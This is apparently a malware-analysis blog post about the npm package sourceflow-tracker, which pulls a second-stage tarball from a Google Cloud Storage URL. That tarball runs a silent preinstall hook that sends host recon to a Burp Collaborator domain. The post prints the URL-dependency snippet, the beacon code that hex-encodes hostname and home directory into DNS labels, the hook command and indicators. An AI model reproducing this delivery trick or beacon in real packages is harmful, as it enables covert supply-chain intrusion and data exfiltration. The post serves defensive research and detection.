---
title: "sourceflow-tracker: I Has a Bucket — npm fetches its own payload"
date: 2026-06-02
summary: "`sourceflow-tracker@99.91.9` is a 379-byte npm shell: a one-line `console.log` for an index, stock metadata, and a single dependency whose version string is a URL into the `lscunpentest` Google Cloud Storage bucket. npm resolves that URL as an ordinary remote tarball, downloads it, and runs its `preinstall` hook — so npm itself fetches and detonates the second stage, and the registry never holds a copy. The fetched tarball is a verbatim copy of the public `network-speed` module with a beacon bolted on that ships the host's internal IPv4, hostname, and home-directory path to a Burp Collaborator subdomain on `oastify.com`. The `lscunpentest` bucket name, the `99.91.9` version, and the Collaborator callback read as dependency-confusion research — the same cluster as shop-minis — but the GCS-as-delivery trick is the novel part."
packageName: sourceflow-tracker
ecosystem: npm
---

<img src="/assets/images/sourceflow-tracker-walrus-bucket.jpg" alt="Meme: a walrus guarding a bucket — 'I has a bucket.' Here npm fetches the payload from the attacker's bucket for them." style="width: 60%; height: auto;">

Most malicious npm packages hide their payload in the tarball you install. `sourceflow-tracker` couldn't be bothered. Its `index.js` is a decoy one-liner, and the only load-bearing thing in the package is a dependency whose version string is a URL into a Google Cloud Storage bucket. npm sees a remote tarball, shrugs, downloads it, and runs the `preinstall` hook inside — so npm does the fetching, npm does the detonating, and the registry never gets a copy of the real payload to scan. What npm dutifully retrieves is a verbatim copy of the public `network-speed` module with a beacon stapled on, phoning the host's internal IP, hostname, and home directory to a Burp Collaborator subdomain. The bucket name `lscunpentest` and the Collaborator callback give it away as dependency-confusion research — same cluster as [shop-minis](/discoveries/2026/05/shop-minis-burp-canary/) — but the walrus has a point: the novel bit is that the payload lives in a bucket, and npm is the one sent to go fetch it.

Traits below are from cleave `2.0.0-rc.4` (traits `a50f8f636`); both stages were unpacked and read statically, nothing was detonated.

## Package metadata

| Field | Value |
| --- | --- |
| Package | `sourceflow-tracker` (npm) |
| Version | `99.91.9` |
| Author (declared) | `lslsls` |
| Description | `lspodcc` |
| License | `UNLICENSED` |
| URL dependency | `ltidisafe` → `https://storage.googleapis.com/lscunpentest/pack_ux_foundry.tgz` |
| Stage-2 package | `s.ls.ls.ls@1.0.5` |
| Stage-2 cover | copy of npm `network-speed` |
| Install vector | `preinstall` hook on the GCS-fetched dependency |
| Callback | `wwwz15e554m201wwajfl7m1ey54z1nq.oastify.com` |

## Stage 1 — sourceflow-tracker: the bucket dependency

The published package is an empty suit: a one-line `index.js`, npm's stock placeholder test script, and metadata that `npm init` defaults could have written on their own. All the intent lives in one dependency entry, where the version — normally a semver range or a registry name — is instead a raw URL into a public GCS bucket. npm resolves remote-tarball URLs without complaint, so installing this package quietly hands Google's storage domain the job of shipping stage two: no registry lookup, no `postinstall` here, nothing for an npm-side scanner to ever sample. And `storage.googleapis.com` makes a perfect mule — a domain nearly every corporate proxy already waves through, hosting a tarball the operator can swap whenever they like without touching npm again. cleave doesn't find this cute either; it carries a rule named for exactly this, a GCS bucket masquerading as a dependency version.

<pre class="lang-js"><code><span class="tok-com">// sourceflow-tracker package.json — the entire malicious surface</span>
<span class="tok-str">"dependencies"</span>: {
  <span class="tok-str">"ltidisafe"</span>: <span class="tok-str">"https://storage.googleapis.com/lscunpentest/pack_ux_foundry.tgz"</span>
}
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/metadata-anomaly/dependency/direct-url::dep-bucket-gcs` | Dependency value is a GCS bucket URL: `storage.googleapis.com/lscunpentest/pack_ux_foundry.tgz` |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/metadata-anomaly/dependency/direct-url::url-dep-minimal-metadata` | URL dependency paired with skeletal metadata (`lspodcc`) |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/metadata-anomaly/versioning::npm-version-major-40-plus` | Version `99.91.9` — a dependency-confusion squat signal |
| <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/metadata-anomaly/package/npm::npm-init-default-test` | Stock `npm init` placeholder test script |

## Stage 2 — pack_ux_foundry: the preinstall beacon

The tarball npm dragged home is a faithful copy of the public `network-speed` module — real, working speed-test code, completely untouched. The malware is a separate `test.js`. The manifest fires it from a `preinstall` hook and routes its output to oblivion, so nobody hears it run. It grabs three things about the host: the internal IPv4 address, the hostname, and the home-directory path. Hostname and home directory get hex-encoded so they survive as a single DNS label; the IP goes out in the clear. Here's the cheeky part — the beacon writes no HTTP client of its own, it just calls the borrowed library's `checkDownloadSpeed` against the Collaborator URL, so the "speed test" is really the exfil and the bandwidth it prints is set dressing. Each value leaves as the leftmost label of `<value>.ux-foundry.<collab>.oastify.com`, which leaks at DNS resolution whether or not the GET ever lands.

<pre class="lang-js"><code><span class="tok-com">// pack_ux_foundry test.js — runs from preinstall, beacons three facts</span>
<span class="tok-kw">const</span> hn = <span class="tok-fn">stringToHex</span>(os.<span class="tok-fn">hostname</span>());   <span class="tok-com">// hostname, hex'd for a DNS label</span>
<span class="tok-kw">const</span> hd = <span class="tok-fn">stringToHex</span>(os.<span class="tok-fn">homedir</span>());   <span class="tok-com">// home dir, hex'd</span>
<span class="tok-kw">var</span> localip = <span class="tok-fn">getIp</span>(<span class="tok-str">'IPv4'</span>);            <span class="tok-com">// internal IPv4, in clear</span>
<span class="tok-fn">getNetworkDownloadSpeedData</span>(localip);    <span class="tok-com">// → GET http://&lt;data&gt;.ux-foundry.&lt;collab&gt;.oastify.com</span>
<span class="tok-fn">getNetworkDownloadSpeedData</span>(hn);
<span class="tok-fn">getNetworkDownloadSpeedData</span>(hd);
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/install-hook/scripts/lifecycle::silent-obfuscated-npm-dropper` | `preinstall` runs `node test.js > /dev/null 2>&1` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/exfiltration/dns/tunnel::subdomain-encode` | Victim data encoded as the leftmost subdomain label of `wwwz15e554m201wwajfl7m1ey54z1nq.oastify.com` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/recon-exfil/dns::dns-lookup-with-canary-domain` | Host recon resolved through an `oast` canary domain |
| <span class="sev-dot notable" title="notable"></span> | `objectives/exfiltration/oob/endpoint::oastify` | Callback host is a Burp Collaborator subdomain on `oastify.com` |
| <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/recon-exfil/package::npm-victim-id-recon` | Collects host identity via `os.networkInterfaces` and `os.homedir` |
| <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/trojanized/library/framework::preinstall-hook` | A `preinstall` hook grafted onto a copied library |

## Same recipe as shop-minis

Strip the costume and this is the [shop-minis](/discoveries/2026/05/shop-minis-burp-canary/) experiment again: a dependency-confusion probe that beacons host recon to a Burp Collaborator subdomain on `oastify.com` and then politely stops — no stealer, no second payload, no persistence. What changed is who carries the bag. shop-minis stuffed everything into one install hook; [clx-cookieparser](/discoveries/2026/05/clx-cookieparser-dependency-twin-beavertail/) ran its own `npm install` at runtime; this one just names a bucket and lets npm's dependency resolver go fetch — payload off the registry entirely, npm still the one running it. The walrus, as ever, has a bucket; the only mercy is that this one holds a recon ping and not a stealer — and the same trick with worse cargo would look identical until somebody re-read the tarball.

## Indicators

| Type | Value |
| --- | --- |
| Stage-0 package | `sourceflow-tracker@99.91.9` (npm) |
| Stage-0 tarball SHA-256 | `4e87b803b8e6a18cfef9bb81e186d927081290f7870ab3ce6cf9b4c2eaf81e3e` |
| Stage-0 index.js SHA-256 | `e89c7bb78ab236d8872813fcf9dea56166bcf717f07b264d819223f06c3d9afd` (benign `console.log`) |
| Stage-0 author / description | `lslsls` / `lspodcc` |
| URL dependency | `ltidisafe` → `https://storage.googleapis.com/lscunpentest/pack_ux_foundry.tgz` |
| GCS bucket | `lscunpentest` (`storage.googleapis.com`) |
| Stage-2 tarball SHA-256 | `1cc73e93d4577fca7478854b4ada86bc78ed8b83369928fd97b4225809d76b52` |
| Stage-2 package | `s.ls.ls.ls@1.0.5` (not on npm; GCS-hosted) |
| Stage-2 index.js SHA-256 | `e9105cfb50a1d8d3d8cabbc1a8dfd0a04966d00bbdd8707d65001e930f842bf5` (verbatim `network-speed` copy) |
| Stage-2 test.js SHA-256 | `6470d87928dbb2ee3950ec33cbc30d1809bf395fadb98cf0d91d6f6e8115d4b0` (the beacon) |
| Trigger | `preinstall`: `node test.js > /dev/null 2>&1` |
| Recon collected | internal IPv4 (clear), hostname (hex-encoded), home directory (hex-encoded) |
| OOB callback | `http://<data>.ux-foundry.wwwz15e554m201wwajfl7m1ey54z1nq.oastify.com` |
| Collaborator host | `wwwz15e554m201wwajfl7m1ey54z1nq.oastify.com` (Burp Collaborator) |
| Classification | dependency-confusion recon probe (Burp Collaborator); same cluster as [shop-minis](/discoveries/2026/05/shop-minis-burp-canary/) |
</content>
</invoke>
